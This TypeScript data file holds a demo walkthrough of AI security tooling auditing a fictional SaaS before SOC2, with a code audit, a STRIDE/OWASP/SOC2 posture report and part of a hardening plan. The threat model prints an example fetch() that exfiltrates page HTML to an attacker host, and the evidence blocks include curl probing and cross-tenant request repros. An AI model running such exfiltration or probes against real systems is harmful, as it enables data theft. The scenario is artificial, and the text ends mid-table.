import type { Walkthrough } from "./types";

/**
 * Scenario 6 — the v1.9 security pair, end to end, on a live SaaS six weeks
 * out from SOC2 Type I fieldwork. oc-code-auditor runs first (the real Step 2
 * precondition: no code-auditor checkpoint → no threat model), oc-security-auditor
 * runs the three pillars and *assesses only*, oc-security-hardening executes,
 * oc-compliance-ops keeps the register, oc-deploy-ops gates. The founder
 * disputes two findings and is right both times.
 */
export const securityHardening: Walkthrough = {
  id: "security-hardening",
  title: "Pass a security review before SOC2 audit",
  tagline: "Graded before the auditor does",
  summary:
    "A pre-audit posture run: STRIDE threat model, OWASP + SOC2 readiness mapping, runtime hardening, and a ticketed remediation backlog. Posture goes D+ → B across one sprint, with a disputed finding and a 4,212-violation CSP soak on the way.",
  description:
    "A Next.js SaaS with 80 paying customers and ~1,900 seats is six weeks out from its first SOC2 Type I. Sales already promised two enterprise prospects it would land by Q4. oc-security-auditor scopes the run at the Comprehensive tier, refuses to threat-model without code-level findings underneath it, and chains oc-code-auditor first — which grades the codebase D on the strength of one service-role Supabase client reached from 23 request handlers. The three pillars follow: STRIDE threat model, OWASP + SOC2 readiness mapping, and a runtime hardening plan. The founder disputes two findings and is right both times — CSP is not a SOC2 control, and a Type I auditor never reads `server.ts` — so the blocker set gets re-derived on the spot. oc-security-auditor assesses but does not fix: oc-security-hardening takes the execution half, and its first CSP report-only soak returns 4,212 violations, every one of them a bug in the plan rather than a gap in the app. The output is a one-screen posture score (D+ → B after Sprint A), a `.opchain/hardening.yaml` manifest the deploy gate can actually verify, and a ranked SEC-101…SEC-112 backlog with day estimates that survive contact with a two-day-a-week contractor.",
  inputs: [
    "Live Next.js 15 SaaS on Vercel Pro · Cloudflare Free plan in front (DNS proxied) · Supabase Postgres · Stripe Checkout",
    "80 paying customers · ~1,900 seats · founder plus one contractor two days a week",
    "Prescient Assurance SOC2 Type I · fieldwork starts 2026-10-26 (six weeks out)",
    "No threat model, no CSP, no admin audit log · Cloudflare on defaults · service-role Supabase key used server-side everywhere",
  ],
  outputs: [
    {
      id: "code-audit-report",
      label: "Code audit — security sweep (grade D)",
      kind: "audit-report.md",
      body:
`# Code Audit — security sweep

**Produced by** oc-code-auditor 1.9.0 · **Verb:** \`/oc-audit security\` · **Date:** 2026-09-14 · **Scope:** \`app/\`, \`src/\` · **Invoked by:** oc-security-auditor (Step 2 precondition) · **Grade: D**

## 0. Why this ran first

oc-security-auditor's Step 2 refuses to build a threat model without code-level
findings underneath it. \`.checkpoints/oc-code-auditor.checkpoint.json\` did not
exist, so this sweep ran first and its findings are the evidence the posture
report cites — not the other way round.

## 1. Counts

\`\`\`
$ grep -rn SUPABASE_SERVICE_ROLE_KEY app src --include='*.ts*' | wc -l
       1
$ grep -rn SUPABASE_SERVICE_ROLE_KEY app src --include='*.ts*'
src/lib/supabase/server.ts:14:  process.env.SUPABASE_SERVICE_ROLE_KEY!,
$ grep -rl 'from "@/lib/supabase/server"' app src --include='*.ts*' | wc -l
      23

 files scanned            147  (TS/TSX under app/ and src/)
 supabase call-sites       23  (19 route handlers, 4 server components)
 service-role clients       1  → reached by all 23
 anon / user-JWT clients    0
 RLS-aware queries        0/23
 zod-validated boundaries 21/23
\`\`\`

One privileged client, imported everywhere. The key itself is only written once,
which is why a secret scan finds nothing interesting — the finding is the reach,
not the leak.

## 2. Findings

\`\`\`
[F-001] Service-role Supabase client used in request handlers
  Severity     CRITICAL
  Category     security
  Location     src/lib/supabase/server.ts:14
               + 23 call-sites — app/api/**/route.ts x19,
                 app/(dashboard)/**/page.tsx x4
  Fix effort   L   (Fixer-class — changes the authz path)
  Problem      The service-role key bypasses every RLS policy. The only thing
               keeping tenant A out of tenant B's rows is a hand-written
               .eq("team_id", session.teamId) in each route. 23 chances to
               forget it, and one of them already has (see F-003).
  Evidence     $ psql "$SUPABASE_DB_URL" -c "select tablename, rowsecurity
                        from pg_tables where schemaname='public'"
                  tablename        | rowsecurity
                 ------------------+-------------
                  tasks            | f
                  teams            | f
                  team_members     | f
                  ... 11 more      | f
                 (14 rows — rowsecurity = f on all 14 tenant-scoped tables)
  Fix          Mint a per-request JWT carrying a team_id claim; swap to
               getSupabase(userJwt); enable RLS + a tenant_isolation policy on
               all 14 tables; assert with a cross-tenant integration test.
\`\`\`

\`\`\`
[F-002] Stack trace rendered in production 500 body
  Severity     HIGH
  Category     security
  Location     app/global-error.tsx:6   ({error.stack})
  Fix effort   S
  Problem      The error boundary renders error.stack into a <pre>. Production
               500s disclose the bundled server path layout and dependency
               versions to any unauthenticated caller who can trigger one.
  Evidence     $ curl -s 'https://app.headsdown.app/api/tasks?team_id=%27' | head -3
                 <pre>TypeError: Cannot read properties of undefined
                   at GET (/var/task/.next/server/app/api/tasks/route.js:31:18)
                   at async /var/task/node_modules/next/dist/server/route-modules/
  Fix          Render error.digest only; keep the trace server-side. Regression
               test: tests/security/no-stack-trace-in-500.spec.ts.
\`\`\`

\`\`\`
[F-003] Tenant id accepted from the query string on /api/export
  Severity     HIGH
  Category     security
  Location     app/api/export/route.ts:18
                 const teamId = searchParams.get("team_id") ?? session.teamId;
  Fix effort   S
  Problem      This is F-001's exploit path made concrete. With the service-role
               client, ?team_id=<other tenant> returns the other tenant's rows.
               No RLS backstop exists.
  Evidence     Repro on staging with two seeded tenants:
                 GET /api/export?team_id=team_acme  (as a team_zeta session)
                 200 · 1,104 rows · first row team_id=team_acme
  Fix          Delete the ?? fallback; teamId comes from the session only. Then
               F-001's JWT work makes the whole class impossible.
\`\`\`

\`\`\`
[F-004] Magic-link endpoint has no throttle
  Severity     MEDIUM
  Category     security
  Location     app/api/auth/magic-link/route.ts:12
  Fix effort   S
  Problem      Unauthenticated POST with an email body, no per-IP or per-email
               limit. Enumeration + mail-bomb surface. Supabase's own limit is
               per-project, not per-caller.
  Evidence     $ for i in $(seq 1 40); do curl -s -o /dev/null -w '%{http_code} ' \\
                   -X POST https://app.headsdown.app/api/auth/magic-link \\
                   -d '{"email":"probe@example.com"}'; done
                 200 200 200 200 ... (40x 200, zero 429)
  Fix          Cloudflare rate-limit rule on /api/auth/* (see SA-003) plus a
               10/hour/email application limit.
\`\`\`

\`\`\`
[F-005] Privileged client built from a NEXT_PUBLIC_ variable
  Severity     MEDIUM
  Category     config
  Location     src/lib/supabase/server.ts:12-14
  Fix effort   S
  Problem      NEXT_PUBLIC_SUPABASE_URL is inlined into the client bundle by
               design. Pairing it with the service-role key in the same factory
               is how a copy-paste ends up in a "use client" file. Not exploitable
               today — bundle grep is clean — but it is one refactor away.
  Evidence     $ grep -r "service_role" .next/static | wc -l
                 0
  Fix          Read SUPABASE_URL (server-only) in the privileged factory.
\`\`\`

\`\`\`
[F-006] Admin routes write no audit record
  Severity     MEDIUM
  Category     security
  Location     app/admin/impersonate/route.ts, app/admin/teams/[id]/route.ts
               (+ 4 more under app/admin/**)
  Fix effort   M
  Problem      Impersonation, plan change and team transfer leave no durable
               record of actor, target, before/after. Forensics and CC7.2
               evidence both depend on it.
  Evidence     $ grep -rn "audit" app/admin | wc -l
                 0
  Fix          admin_audit_log table + logAdminAction() wrapper at all 6 entry
               points. Tracked as SA-007 / SEC-102.
\`\`\`

## 3. Recommended fix order

1. **F-003** — 20 minutes, removes the live cross-tenant path today.
2. **F-002** — 2 hours, removes a live disclosure today.
3. **F-001** — the real work (5 days); F-003 and F-006 collapse into it.
4. **F-005** — fold into the F-001 PR, same file.
5. **F-004** — closes with the Cloudflare rate-limit rule, not with code.

A Fixer would add an ESLint \`no-restricted-imports\` rule banning
\`@/lib/supabase/server\` from \`app/**\`. I did not add it — the Auditor is
read-only. It is queued under F-001 so the rule lands with the rewrite it
protects, not before it (23 grandfathering comments would be worse than no rule).

## 4. Grade

\`\`\`
 CRITICAL   1   (F-001)
 HIGH       2   (F-002, F-003)
 MEDIUM     3   (F-004, F-005, F-006)
 LOW        0
 Grade      D   — a CRITICAL in the authz path caps the grade at D regardless
                  of the rest; test suite is green (214 passing) and types are
                  clean, which is why it is not F.

 eval_scores:
   rubric      oc-code-auditor
   score       4.0 / 10
   dimensions  security 3 · quality 6 · config 5
   weighting   security 0.6 · quality 0.2 · config 0.2
               (0.6x3 + 0.2x6 + 0.2x5 = 4.0)
\`\`\`

Checkpoint written: \`.checkpoints/oc-code-auditor.checkpoint.json\`
(\`route: security\`, \`findings_total: 6\`, \`grade: "D"\`). Returning control to
oc-security-auditor.`,
    },
    {
      id: "threat-model",
      label: "Security posture report — STRIDE + OWASP + SOC2 readiness",
      kind: "threat-model.md",
      body:
`# Security Posture Report — heads-down-app

**Date:** 2026-09-14 · **Scope:** posture (all three pillars) · **Tier:** Comprehensive · **Assessor:** oc-security-auditor 1.9.0 · **Run-time:** 22 minutes · **Code-level input:** oc-code-auditor grade D, 6 findings (read from \`.checkpoints/oc-code-auditor.checkpoint.json\`)

> **This is a readiness mapping, not a certification.** Nothing here is an audit
> opinion, an attestation, or a SOC2 report. It maps observed system state onto
> the criteria a Type I auditor will test, so the gaps are known before fieldwork.

## 0. Executive summary

heads-down-app is one hand-written \`.eq()\` away from cross-tenant data
disclosure on every tenant-scoped endpoint, and oc-code-auditor found a route
where that \`.eq()\` is already bypassable from the query string. That is SA-001,
and it is the only finding on this list that would make a signed CC6.1
statement untrue. Everything else is a real gap of the ordinary kind: two of
eight security response headers are set, the edge still negotiates TLS 1.0,
nothing rate-limits the unauthenticated auth surface, and no durable record
exists of what an admin did to whose account.

Detection is the quieter problem. Errors reach Sentry; nothing else does. There
is no alerting rule a human is paged by, no privileged-action log, and log
retention (3 days on Vercel Pro, 3 days on Cloudflare Free analytics) is shorter
than the window a Type I auditor asks you to produce evidence from.

**Posture grade: D+.** Eight findings — 1 CRITICAL, 3 HIGH, 3 MEDIUM, 1 LOW.
OWASP 5/10 PASS. Header score 2/8. Detection & response 2/6. SOC2 readiness:
22 points of focus in scope, 9 satisfied, 6 partial, 7 gap.

## 1. Risk heatmap

| Domain | Grade | Driving findings |
|---|---|---|
| Authentication | C | SA-005 (cookie \`SameSite=Lax\`), F-004 (unthrottled magic link) |
| Authorization | **F** | SA-001, SA-006, F-001, F-003 |
| Data protection | D | SA-002 (no CSP), SA-004 (stack traces in 500s) |
| Infrastructure | D | SA-003 (no WAF/rate-limit), TLS 1.0 accepted, headers 2/8 |
| Compliance | D | 7 points of focus with no control in place |
| Threat surface | C | 12 reachable routes, 4 of them unauthenticated |
| Detection & response | **F** | 2/6 — no alerting, no privileged-action log, 3-day retention |

## 2. Scope + assumptions

- **In scope:** the live product, end to end. Browser → Cloudflare (DNS proxy, Free plan) → Vercel Pro (Next 15) → Supabase Postgres, plus the Stripe back-channel.
- **Out of scope:** the marketing site (separate Vercel project, no auth, no PII).
- **Team reality:** founder + 1 contractor, two days a week (Tue/Wed). Every "owner" in this document is one of those two people. Controls that assume a security team are not proposed.
- **Threat-actor profiles considered:**

  | Profile | Motive | Capability tier | Realistic? |
  |---|---|---|---|
  | Anonymous internet attacker | opportunistic credential reuse, defacement, ransom | Tier 1 (commodity tooling) | YES — daily probe traffic in Cloudflare events |
  | Customer with valid credentials | data exfil beyond their own tenant | Tier 2 (some scripting; reads OWASP) | YES — this is SA-001's actor |
  | Contractor with repo access | inadvertent privilege escalation; over-broad access | Tier 1-2 | YES — full repo + Supabase dashboard access today |
  | Third party (Stripe) credential leak | benign actor, hostile outcome | Tier 2-3 | YES — subprocessor breach impact |
  | Departing contractor | targeted exfil; sabotage | Tier 2-3 | LOW today; rises the moment the engagement ends |
- **Not considered:** nation-state APT, social engineering of the founder, physical access to laptops.

## 3. System boundaries

\`\`\`
[browser] ──https──► [cloudflare edge] ──https──► [vercel / next 15] ──tls──► [supabase]
                           │  (Free plan)               │                          │
                           │                            │                          └─ RLS: OFF on 14/14 tables
                           ├─ DNS proxy                 ├─ session cookie auth
                           ├─ Bot Fight Mode (off)      ├─ middleware.ts: auth redirects only
                           ├─ rate-limit (none)         └──► [stripe] ──https──► [webhook back-channel]
                           └─ WAF (Free default only)
\`\`\`

| Boundary | Who controls | Authentication primitive | Where the log lives | Retention |
|---|---|---|---|---|
| 1. Internet → Edge | Cloudflare | none (anonymous traffic) | Cloudflare events (Free) | 3 days |
| 2. Edge → App | Vercel | session cookie (\`HttpOnly\`, \`SameSite=Lax\`) | Vercel runtime logs + Sentry | 3 days / 90 days |
| 3. App → Data | Supabase | **service-role key** (per-tenant JWT is the target) | Supabase logs | 7 days |
| 3'. App ↔ Stripe | Stripe | HMAC-signed webhook | Stripe dashboard + Vercel logs | 30 days / 3 days |

Retention is the row to read twice: the longest-lived security-relevant log
today is Sentry's 90 days, and Sentry only sees application exceptions.

## 4. Data classification

| Class | Examples | Storage | Retention |
|---|---|---|---|
| RESTRICTED | Stripe customer id, subscription state, session tokens | Postgres + Stripe | session 30d idle; customer id for account life |
| CONFIDENTIAL | task content, team membership, export files | Postgres + Vercel blob | account life; 30d soft-delete |
| PII | email, display name | Postgres | account life; 30d soft-delete |
| Operational | logs, metrics | Cloudflare + Vercel + Sentry | 3d / 3d / 90d |
| Public | marketing copy | static | indefinite |

No card data is stored or transited — Stripe Checkout is hosted, so PCI scope is
SAQ-A. That stays true only while there is no custom payment surface.

## 5. Attack surface map

Every externally reachable route, what it trusts, and what it can return.

| # | Route | Method | Auth | Untrusted input | Sensitive data | Risk |
|---|---|---|---|---|---|---|
| 1 | \`/api/auth/magic-link\` | POST | none | email | PII | HIGH — F-004, no throttle |
| 2 | \`/api/auth/callback\` | GET | one-time token | token | session | HIGH |
| 3 | \`/api/tasks\` | GET POST | session | body, \`?cursor\` | CONFIDENTIAL | **CRITICAL** — SA-001 |
| 4 | \`/api/tasks/[id]\` | GET PATCH DELETE | session | path id | CONFIDENTIAL | **CRITICAL** — SA-001 |
| 5 | \`/api/teams/[id]/members\` | GET POST | session | path id | PII | HIGH |
| 6 | \`/api/export\` | GET | session | **\`?team_id\`** | CONFIDENTIAL | **CRITICAL** — F-003 |
| 7 | \`/api/billing/checkout\` | POST | session | price id | RESTRICTED | HIGH |
| 8 | \`/api/billing/portal\` | POST | session | — | RESTRICTED | MEDIUM |
| 9 | \`/api/stripe/webhook\` | POST | HMAC | Stripe event | RESTRICTED | MEDIUM — SA-008 |
| 10 | \`/admin/impersonate\` | POST | session + role | user id | CONFIDENTIAL | HIGH — SA-006, SA-007 |
| 11 | \`/admin/teams/[id]\` | GET PATCH | session + role | path id | CONFIDENTIAL | MEDIUM — SA-007 |
| 12 | \`/api/health\` | GET | none | — | none | LOW |

Four routes are reachable without a session (1, 2, 9, 12). Three routes read a
tenant identifier from request input rather than session state (4, 5, 6); route 6
is the one where that identifier wins over the session, which is F-003.

## 6. Data-flow trace — Stripe customer id (RESTRICTED)

Traced end to end because it is the only RESTRICTED field that crosses all three
boundaries.

1. **Creation.** \`/api/billing/checkout\` calls Stripe, receives \`cus_…\`, writes it to \`teams.stripe_customer_id\` via the **service-role** client. RLS off.
2. **At rest.** Postgres column, no column-level encryption, no masking in the Supabase dashboard — any holder of dashboard access sees every tenant's id.
3. **Read path.** Rendered into the billing page through a server component (one of the 4 non-route call-sites in F-001) and into the CSV produced by \`/api/export\` — which is the route with the \`?team_id\` override.
4. **Egress.** Appears in Stripe webhook payloads logged to Vercel runtime logs (3-day retention) in full.
5. **Deletion.** Not deleted on account soft-delete; the row persists for the 30-day window and then the id remains on the archived row.

**Gap:** steps 3 and 4 combined mean a cross-tenant read on \`/api/export\`
returns another tenant's billing identifier, not just their task text. That is
what moves SA-001's impact from CONFIDENTIAL to RESTRICTED.

## 7. STRIDE findings

Severity is Likelihood × Impact, not a CVSS score. Legend:

| | Impact LOW | Impact MED | Impact HIGH |
|---|---|---|---|
| **Likelihood HIGH** | LOW | HIGH | **CRITICAL** |
| **Likelihood MED** | LOW | MEDIUM | HIGH |
| **Likelihood LOW** | LOW | LOW | MEDIUM |

### 7.1 Per trust boundary

**Boundary 1 — Internet → Edge (Cloudflare, Free plan)**

| Id | STRIDE | Finding | L × I | Sev |
|---|---|---|---|---|
| SA-003 | Denial of service | Cloudflare on Free defaults. No rate-limit rule, Bot Fight Mode off, Security Level medium. \`/api/auth/*\` absorbs 40 unthrottled requests (F-004). | HIGH × MED | HIGH |

**Boundary 2 — Edge → App (Vercel)**

| Id | STRIDE | Finding | L × I | Sev |
|---|---|---|---|---|
| SA-002 | Information disclosure | No \`Content-Security-Policy\`. Any injection foothold has full DOM reach. Header sweep returns 2/8. | MED × HIGH | HIGH |
| SA-004 | Information disclosure | Production 500s render \`error.stack\` (F-002). Source layout and dependency paths disclosed to anonymous callers. | HIGH × MED | HIGH |
| SA-005 | Spoofing | Session cookie is \`HttpOnly\`+\`Secure\` but \`SameSite=Lax\` and unprefixed. CSRF reachable on state-changing top-level navigations. | MED × MED | MEDIUM |

**Boundary 3 — App → Data (Supabase)**

| Id | STRIDE | Finding | L × I | Sev |
|---|---|---|---|---|
| SA-001 | Tampering / Info disclosure | Service-role client used for tenant-scoped queries from 23 call-sites (F-001); RLS disabled on all 14 tenant tables; one route already takes \`team_id\` from the query string (F-003). | HIGH × HIGH | **CRITICAL** |
| SA-006 | Elevation of privilege | Admin role is checked at the route boundary only. Nothing at the data layer distinguishes an admin read from a tenant read. | LOW × HIGH | MEDIUM |

**Boundary 3' — App ↔ Stripe**

| Id | STRIDE | Finding | L × I | Sev |
|---|---|---|---|---|
| SA-008 | Tampering | Webhook verifies the HMAC signature correctly, but does not check origin against Stripe's published ranges. Defence-in-depth gap only. | LOW × LOW | LOW |

**Cross-boundary**

| Id | STRIDE | Finding | L × I | Sev |
|---|---|---|---|---|
| SA-007 | Repudiation | No audit record for impersonation, plan change or team transfer (F-006). Six admin routes, zero writes. | gap × MED | MEDIUM |

### 7.2 Ranked

| Id | Sev | Boundary | Source | Ticket |
|---|---|---|---|---|
| SA-001 | CRITICAL | 3 | F-001, F-003 | SEC-101 |
| SA-002 | HIGH | 2 | header sweep | SEC-107 |
| SA-003 | HIGH | 1 | F-004, edge config | SEC-108 |
| SA-004 | HIGH | 2 | F-002 | SEC-106 |
| SA-005 | MEDIUM | 2 | cookie inspection | SEC-110 |
| SA-006 | MEDIUM | 3 | route review | SEC-112 |
| SA-007 | MEDIUM | cross | F-006 | SEC-102 |
| SA-008 | LOW | 3' | webhook review | SEC-111 |

### 7.3 Walked chain — SA-001

- **Actor:** Tier-2. A paying customer, or anyone holding a session for any tenant. No need to touch the service-role key itself.
- **Prerequisite:** one valid session. That is the whole prerequisite.
- **Steps:**
  1. Authenticate normally as tenant \`team_zeta\`.
  2. \`GET /api/export?team_id=team_acme\` — the route prefers the query parameter over session state (\`app/api/export/route.ts:18\`).
  3. The service-role client executes the query. RLS is off on \`tasks\`, so there is no second line of defence.
  4. Response: 200, 1,104 rows, including \`teams.stripe_customer_id\` for a tenant the caller has no relationship with.
- **Reproduced:** yes, on staging with two seeded tenants (F-003 evidence block).
- **CVSS 3.1 (for the auditor's register):** \`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N\` → **9.6**. Recorded because the compliance register wants a vector; the remediation order is driven by the matrix above, not by the decimal.
- **Blast radius:** cross-tenant disclosure of CONFIDENTIAL task content and RESTRICTED billing identifiers. Plausible breach-notification trigger under several state privacy statutes.
- **Time to detect, today:** indeterminate. Nothing counts rows per tenant; the first signal would be a customer support ticket.
- **Time to detect, post-fix:** immediate and structural — the per-tenant JWT makes the same request return 0 rows, and the denial is logged by Postgres.

### 7.4 Walked chain — SA-002

- **Actor:** Tier 1-2 with any injection foothold — a stored payload in a task title rendered into the admin console, or a reflected parameter.
- **Steps:**
  1. Inject a script payload through the vulnerable surface.
  2. With no CSP, the script executes with full DOM access.
  3. \`HttpOnly\` blocks reading the session cookie, so the attacker exfiltrates rendered content instead: \`fetch("https://collector.attacker.example/l", { method: "POST", body: document.documentElement.innerHTML })\`.
- **Note on severity:** this is a *mitigation* gap, not a vulnerability. No XSS was found in this codebase; 21 of 23 boundaries are Zod-validated and React escapes by default. CSP is the control that makes the class survivable, which is why it is HIGH and not CRITICAL.
- **Time to detect, post-CSP:** seconds — the violation report fires as the script is blocked.

## 8. Detection & response

| # | Capability | Present | Evidence |
|---|---|---|---|
| 1 | Centralised error capture | **YES** | Sentry, 90-day retention, all runtimes |
| 2 | Security-relevant alert rules that reach a human | NO | Sentry has one rule: "new issue type" → email. Nothing security-scoped. |
| 3 | Durable log of privileged actions | NO | SA-007 / F-006 |
| 4 | Log retention ≥ 90 days for security events | NO | Vercel 3d, Cloudflare Free 3d, Supabase 7d |
| 5 | Documented incident-response procedure | **YES** | \`docs/runbooks/incident-response.md\`, written 2026-03 |
| 6 | Tested IR drill in the last 12 months | NO | No drill record on file |

**Detection & response: 2/6.** The remediation is deliberately small: Sentry
alert rules (#2), the \`admin_audit_log\` table (#3), and one Cloudflare Logpush
job to R2 with a 1-year lifecycle (#4). No new vendor. A one-founder company does
not get a second observability tool it will not read.

## 9. Header sweep

\`\`\`
$ curl -sI https://app.headsdown.app | grep -iE 'content-security|strict-transport|x-frame|x-content-type|referrer|permissions|cross-origin'
x-frame-options: SAMEORIGIN
x-content-type-options: nosniff
\`\`\`

| # | Header | Present | Target |
|---|---|---|---|
| 1 | \`Content-Security-Policy\` | ✗ | nonce-based, \`frame-ancestors 'none'\` |
| 2 | \`Strict-Transport-Security\` | ✗ | \`max-age=300\` → \`63072000; includeSubDomains\` |
| 3 | \`X-Content-Type-Options\` | ✓ | \`nosniff\` |
| 4 | \`X-Frame-Options\` | ✓ | superseded by \`frame-ancestors\`, keep for old clients |
| 5 | \`Referrer-Policy\` | ✗ | \`strict-origin-when-cross-origin\` |
| 6 | \`Permissions-Policy\` | ✗ | \`camera=(), microphone=(), geolocation=()\` |
| 7 | \`Cross-Origin-Opener-Policy\` | ✗ | \`same-origin\` |
| 8 | \`Cross-Origin-Resource-Policy\` | ✗ | \`same-origin\` |

**Header score: 2/8.**

TLS, same sweep:

\`\`\`
$ openssl s_client -tls1 -connect app.headsdown.app:443 </dev/null 2>&1 | grep -E 'Protocol|Cipher'
    Protocol  : TLSv1
    Cipher    : ECDHE-RSA-AES128-SHA
\`\`\`

TLS 1.0 negotiates successfully. That is the Cloudflare Free default (Minimum
TLS Version 1.0) and it is a one-click change; it is folded into SA-003's ticket
rather than raised as its own finding.

## 10. OWASP Top 10 (2021)

| # | Category | Status | Findings | Evidence |
|---|---|---|---|---|
| A01 | Broken Access Control | **FAIL** | SA-001, SA-006 | Service-role client reached from 23 call-sites; RLS off on 14/14 tables; \`?team_id\` override reproduced on \`/api/export\` |
| A02 | Cryptographic Failures | **PARTIAL** | — | TLS 1.0 accepted at the edge (\`openssl s_client -tls1\` above). No plaintext at rest; no hand-rolled crypto; auth handled by Supabase |
| A03 | Injection | PASS | — | Parameterised throughout (\`@supabase/supabase-js\`); Zod schemas on 21/23 boundaries; the 2 gaps are both admin-only and take no user string |
| A04 | Insecure Design | PASS | — | This document. Adversarial review performed today; committed under H-1 |
| A05 | Security Misconfiguration | **FAIL** | SA-002, SA-003, SA-004 | Header score 2/8; Cloudflare on Free defaults; \`error.stack\` in production 500 bodies |
| A06 | Vulnerable Components | PASS | — | \`npm audit\` 0 critical / 0 high; Dependabot weekly, patch PRs auto-merge |
| A07 | Identification & Auth | **PARTIAL** | — | Magic link has no per-caller throttle (F-004); 40 consecutive 200s observed. Session cookie is \`HttpOnly\`+\`Secure\` |
| A08 | Software / Data Integrity | PASS | — | Vercel deployments are immutable per commit and CI is required on \`main\`; no \`eval\`, no unpinned remote script |
| A09 | Logging & Monitoring | **PARTIAL** | SA-007 | Sentry covers exceptions; privileged actions untraced; security log retention 3 days |
| A10 | Server-Side Request Forgery | PASS | — | No user-supplied URL is fetched server-side; the only outbound calls are Stripe and Supabase with hard-coded hosts |

**OWASP: 5 PASS · 3 PARTIAL · 2 FAIL.**

Note on A08: "signed deployments" would be the wrong claim. Vercel does not sign
deployments; what is true is that a deployment is immutable and addressable by
commit SHA, and that CI is a required check.

## 11. SOC2 readiness — points of focus

22 points of focus are in scope for this system across CC3, CC6, CC7, CC8 and
CC9. **9 satisfied · 6 partial · 7 gap.** The seven with no control in place:

| Point of focus | Requirement | Current state | Gap | Effort |
|---|---|---|---|---|
| CC6.1 | Logical access controls restrict access to protected information assets | Tenant segregation depends on a hand-written predicate in 23 handlers; RLS off | An attestation that "tenant data is logically segregated" would be untrue as written | 5.0d (B-1) |
| CC6.6 | Logical access measures protect against threats from outside the system boundary | Cloudflare Free defaults; no rate-limit, no bot mitigation, TLS 1.0 accepted | No edge control applied to the unauthenticated surface | 1.0d (C-3) |
| CC6.7 | Transmission and removal of information is restricted to authorised users | \`/api/export\` honours a caller-supplied tenant id | Export path is the removal path; it is not restricted | folded into B-1 |
| CC7.2 | Monitoring detects anomalies indicative of malicious acts | Sentry exceptions only; no privileged-action log; 3-day retention | Nothing to monitor and nowhere to monitor it from | 1.5d (B-2) |
| CC7.3 | Security events are evaluated to determine whether they constitute an incident | Runbook exists; no drill, no evaluation record | Procedure untested | 0.25d (B-5) |
| CC8.1 | Changes are authorised, designed, tested and approved | CI required, PRs reviewed, but no security gate on the deploy path | The deploy gate is advisory until \`/oc-harden verify\` runs in CI | 0.25d (C-4) |
| CC9.2 | Vendors and business partners are assessed and managed | Five subprocessors, no inventory, DPA status unknown for two | No register | 0.5d (B-4) |

**Readiness mapping, not certification.** Prescient Assurance tests control
design against the policies heads-down-app writes and signs. This table says
which of those policies cannot be signed honestly today.

## 12. Recommendation

> **Amended 2026-09-14 after founder review.** The first draft of this section
> called SA-002 (no CSP) a "hard SOC2 blocker" and claimed an auditor would
> "flag it inside ten minutes". Both statements were wrong. A Type I auditor
> tests control design against your stated policies; nobody reads
> \`src/lib/supabase/server.ts\`. CSP is not a SOC2 control. Corrected below.

**Type I blockers — the set that makes a signed statement untrue or leaves a
checklist line empty:**

1. **SA-001.** The CC6.1 statement "tenant data is logically segregated" is part of every security policy template Prescient will hand over, and it is currently false. This is the one finding that fails on its own merits. → B-1.
2. **SA-007.** CC7.2 asks for monitoring of privileged action. There is nothing to show. → B-2.
3. **H-1.** CC3.2 asks for a documented risk/threat assessment. This document, committed, closes it. → B-3.
4. **H-2.** CC9.2 asks for a subprocessor register with DPA status. → B-4.
5. **H-4.** CC7.3 asks for evidence the IR procedure has been exercised. One tabletop drill with a written record. → B-5.

**Not blockers, still real:** SA-002 (CSP) is CC6.6-adjacent evidence at best and
is re-tiered to C-2. SA-003, SA-004, SA-005, SA-006 and SA-008 are ordinary
security debt on a normal remediation schedule.

**Assessment only.** This skill does not apply fixes. The runtime-hardening
items are handed to **oc-security-hardening** (\`/oc-harden csp\`,
\`/oc-harden fix …\`), the code-level items stay with **oc-code-auditor**'s Fixer
(\`/oc-audit fix F-001\`), and the policy/register items go to
**oc-compliance-ops** (\`/oc-comply policies\`).

## 13. Deliberately out of scope

- **Penetration test.** Book it after Sprint B; a pen test against SA-001 would only rediscover SA-001.
- **MFA enforcement for admin users.** Type II concern; not a Type I control-design gap.
- **Tenant-managed encryption keys (BYOK).** Real enterprise ask, ~3 weeks, no bearing on Type I.
- **PCI scope.** SAQ-A today because Checkout is hosted. Revisit only if a custom payment surface is ever built.
- **Insider-threat programme.** Two people. Not a Type I requirement at this headcount.

## 14. Auditor pre-meeting Q&A

Questions Prescient's Type I kickoff will ask, with the honest answer as of
2026-09-14 and where the evidence will live:

1. **"Do you have a documented risk assessment?"** — Yes, as of today: this document at \`docs/security/threat-model.md\`, reviewed quarterly. (B-3)
2. **"How is tenant data segregated?"** — Today: an application-layer predicate. After B-1: Postgres RLS with a \`tenant_isolation\` policy on all 14 tables, enforced by a per-request JWT claim, asserted by \`tests/security/cross-tenant.spec.ts\`. Do not answer this one until B-1 ships.
3. **"How are privileged actions recorded?"** — After B-2: \`admin_audit_log\`, actor / target / before / after / IP / UA, 1-year retention per \`docs/security/retention-policy.md\`. Today: they are not.
4. **"What is your incident-response procedure, and when did you last exercise it?"** — Runbook exists; drill scheduled under B-5 with a written record.
5. **"List your subprocessors and their DPA status."** — Cloudflare, Vercel, Supabase, Stripe, Sentry. Register under B-4; two DPAs need countersigning.
6. **"How do changes reach production?"** — PR, required CI, oc-code-auditor + oc-security-auditor gates, \`/oc-harden verify\` in CI after C-4. Vercel deployments are immutable per commit.
7. **"What is your patch cadence?"** — Dependabot weekly, patch PRs auto-merge, advisories triaged on the CI failure.
8. **"Show me your security headers."** — Today 2/8, and say so; after Sprint A, 7/8 with CSP still in report-only. An honest number beats a promised one.

Checkpoint: \`.checkpoints/oc-security-auditor.checkpoint.json\`.`,
    },
    {
      id: "hardening-plan",
      label: "Runtime hardening plan (Pillar 3)",
      kind: "hardening.md",
      body:
`# Runtime Hardening Plan — heads-down-app

**Produced by** oc-security-auditor Pillar 3 (Runtime Hardening) · **Executed by** oc-security-hardening (\`/oc-harden\`) · **Date:** 2026-09-14 · **Effort:** ≈ **6.5 engineering days**, 1.5 of them Cloudflare dashboard toggles · **Control ids** below are written to \`.opchain/hardening.yaml\` by \`/oc-harden\` and verified by \`/oc-harden verify\`.

oc-security-auditor assesses; it does not apply fixes. Every item here carries the
control id and the \`/oc-harden\` verb that executes it.

## 0. Effort ledger

| § | Item | Control id | Effort | Kind |
|---|---|---|---|---|
| 1 | CSP: middleware, nonce, report route, soak, enforce | \`headers.csp\` | 2.0d | code |
| 1.5 | Six remaining response headers | \`headers.baseline\` | 0.25d | code |
| 2 | SSL Full (strict), Min TLS 1.2, HSTS, CAA | \`cf.tls.min\`, \`headers.hsts\`, \`dns.caa\` | 0.5d | dashboard |
| 3 | Rate-limit rule + Bot Fight Mode + Security Level | \`cf.waf.ratelimit.auth\`, \`cf.bot-fight\` | 0.5d | dashboard |
